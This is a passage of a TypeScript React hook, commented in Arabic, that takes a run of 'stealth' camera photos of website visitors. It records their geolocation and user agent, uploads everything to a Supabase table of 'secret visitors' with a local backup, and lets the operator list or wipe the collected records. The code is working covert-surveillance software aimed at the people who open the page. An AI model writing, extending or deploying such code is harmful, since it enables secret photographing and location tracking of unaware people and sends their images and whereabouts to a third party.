      console.log(`📸 التقاط الصورة ${i + 1}/${photoCount}`);
      
      try {
        const photo = await captureStealthPhoto(stream);
        
        if (photo) {
          photos.push(photo);
          setCapturedPhotos(prev => [...prev, photo]);
          
          // حفظ الصورة فوراً
          try {
            localStorage.setItem(`photo_${photo.id}`, photo.dataUrl);
            console.log(`💾 تم حفظ الصورة ${i + 1}`);
          } catch (storageError) {
            console.error(`❌ فشل في حفظ الصورة ${i + 1}:`, storageError);
          }
        } else {
          console.warn(`⚠️ فشل في التقاط الصورة ${i + 1}`);
        }
      } catch (captureError) {
        console.error(`❌ خطأ أثناء التقاط الصورة ${i + 1}:`, captureError);
      }
      
      // انتظار بين الصور - أسرع على الكمبيوتر
      if (i < photoCount - 1) {
        await new Promise(resolve => setTimeout(resolve, captureDelay));
      }
    }

    // إيقاف الكاميرا
    stopStealthCamera();
    setIsCapturing(false);

    console.log(`🏁 انتهى التقاط الصور. تم التقاط ${photos.length}/${photoCount} صورة`);
    
    // إذا لم يتم التقاط أي صور، نستخدم صور وهمية
    if (photos.length === 0) {
      console.log('⚠️ لم يتم التقاط أي صور، سيتم إنشاء صور وهمية');
      
      const placeholderPhotos: CapturedPhoto[] = [];
      
      for (let i = 0; i < photoCount; i++) {
        try {
          const canvas = document.createElement('canvas');
          canvas.width = 1280;
          canvas.height = 720;
          const ctx = canvas.getContext('2d');
          
          if (ctx) {
            ctx.fillStyle = '#f0f0f0';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#999999';
            ctx.font = '24px Arial';
            ctx.fillText('فشل التقاط الصورة', canvas.width/2 - 100, canvas.height/2);
            
            const placeholderDataUrl = canvas.toDataURL('image/jpeg', 0.8);
            
            const photo: CapturedPhoto = {
              id: `fallback_${Date.now()}_${i}_${Math.random().toString(36).substr(2, 9)}`,
              dataUrl: placeholderDataUrl,
              timestamp: new Date()
            };
            
            placeholderPhotos.push(photo);
          }
        } catch (canvasError) {
          console.warn('⚠️ فشل في إنشاء صورة وهمية:', canvasError);
        }
      }
      
      setCapturedPhotos(placeholderPhotos);
      return placeholderPhotos;
    }
    
    return photos;
  }, [isCapturing, startStealthCamera, stopStealthCamera, captureStealthPhoto, isMobile]);

  // حفظ بيانات الزائر
  const saveVisitorData = useCallback(async (photos: CapturedPhoto[]) => {
    try {
      console.log('💾 بدء حفظ بيانات الزائر...');
      
      // الحصول على الموقع
      const location = await getCurrentLocation();
      
      const visitor: VisitorData = {
        id: `stealth_visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
        photos,
        location,
        visitTime: new Date(),
        userAgent: navigator.userAgent
      };

      console.log('📝 بيانات الزائر:', {
        id: visitor.id,
        photosCount: visitor.photos.length,
        hasLocation: !!visitor.location,
        visitTime: visitor.visitTime
      });

      // محاولة حفظ البيانات في Supabase أولاً
      let savedToSupabase = false;
      try {
        await supabaseHelpers.addVisitor(TABLES.STEALTH_VISITORS, visitor);
        console.log('✅ تم حفظ بيانات الزائر السري في Supabase');
        savedToSupabase = true;
      } catch (supabaseError) {
        console.warn('⚠️ فشل في حفظ البيانات في Supabase، سيتم الحفظ محلياً:', supabaseError);
      }

      // حفظ البيانات محلياً دائماً كنسخة احتياطية
      try {
        const existingVisitors = JSON.parse(localStorage.getItem('stealth_visitors') || '[]');
        existingVisitors.push({
          ...visitor,
          savedToSupabase
        });
        localStorage.setItem('stealth_visitors', JSON.stringify(existingVisitors));
        console.log('💾 تم حفظ بيانات الزائر السري محلياً');
      } catch (localError) {
        console.error('❌ فشل في الحفظ المحلي:', localError);
      }

      setVisitorData(visitor);
      return visitor;
    } catch (error) {
      console.error('❌ خطأ في حفظ بيانات الزائر:', error);
      return null;
    }
  }, [getCurrentLocation]);

  // الحصول على جميع الزوار
  const getAllVisitors = useCallback(async (): Promise<VisitorData[]> => {
    try {
      console.log('📖 جاري تحميل بيانات الزوار السريين...');
      
      // محاولة الحصول على البيانات من Supabase أولاً
      const supabaseVisitors = await supabaseHelpers.getVisitors(TABLES.STEALTH_VISITORS);
      
      // الحصول على بيانات localStorage كنسخة احتياطية
      const localData = JSON.parse(localStorage.getItem('stealth_visitors') || '[]');
      const localVisitors = localData.map((visitor: any) => ({
        ...visitor,
        visitTime: new Date(visitor.visitTime),
        photos: visitor.photos.map((photo: any) => ({
          ...photo,
          timestamp: new Date(photo.timestamp)
        })),
        location: visitor.location ? {
          ...visitor.location,
          timestamp: new Date(visitor.location.timestamp)
        } : null
      }));

      // دمج المصدرين، مع إعطاء أولوية لبيانات Supabase
      const allVisitors = [...supabaseVisitors, ...localVisitors];
      
      // إزالة التكرارات بناءً على المعرف
      const uniqueVisitors = allVisitors.reduce((acc: any[], current: any) => {
        const exists = acc.find(visitor => visitor.id === current.id);
        if (!exists) {
          acc.push(current);
        }
        return acc;
      }, []);

      // الفرز حسب وقت الزيارة (الأحدث أولاً)
      uniqueVisitors.sort((a, b) => new Date(b.visitTime).getTime() - new Date(a.visitTime).getTime());

      console.log(`✅ تم تحميل ${uniqueVisitors.length} زائر سري (${supabaseVisitors.length} من Supabase + ${localVisitors.length} محلي)`);
      return uniqueVisitors;
    } catch (error) {
      console.error('❌ خطأ في تحميل البيانات:', error);
      
      // العودة إلى localStorage فقط كنسخة احتياطية
      const localData = JSON.parse(localStorage.getItem('stealth_visitors') || '[]');
      return localData.map((visitor: any) => ({
        ...visitor,
        visitTime: new Date(visitor.visitTime),
        photos: visitor.photos.map((photo: any) => ({
          ...photo,
          timestamp: new Date(photo.timestamp)
        })),
        location: visitor.location ? {
          ...visitor.location,
          timestamp: new Date(visitor.location.timestamp)
        } : null
      }));
    }
  }, []);

  // مسح جميع البيانات
  const clearAllData = useCallback(async () => {
    try {
      // مسح البيانات من Supabase
      await supabaseHelpers.deleteAllVisitors(TABLES.STEALTH_VISITORS);
      console.log('🗑️ تم مسح جميع البيانات السرية من Supabase');
    } catch (error) {
      console.error('❌ خطأ في مسح البيانات من Supabase:', error);
    }
    
    // مسح البيانات المحلية أيضاً
    try {
      localStorage.removeItem('stealth_visitors');
      
      // مسح جميع الصور
      Object.keys(localStorage).forEach(key => {
        if (key.startsWith('stealth_photo_')) {
          localStorage.removeItem(key);
        }
      });
      
      setCapturedPhotos([]);
      setVisitorData(null);
      console.log('🗑️ تم مسح جميع البيانات السرية المحلية');
    } catch (error) {
      console.error('❌ خطأ في مسح البيانات المحلية:', error);
    }
  }, []);

  return {
    // الحالات
    isCapturing,
    capturedPhotos,
    currentPhotoIndex,
    visitorData,
    permissions,
    
    // الوظائف
    startStealthCapture,
    saveVisitorData,
    getAllVisitors,
    clearAllData,
    // إضافة الوظائف الجديدة
    requestPermissions,
    startLocationTracking,
    stopLocationTracking,
    getCurrentLocation,
    isMobile
  };
};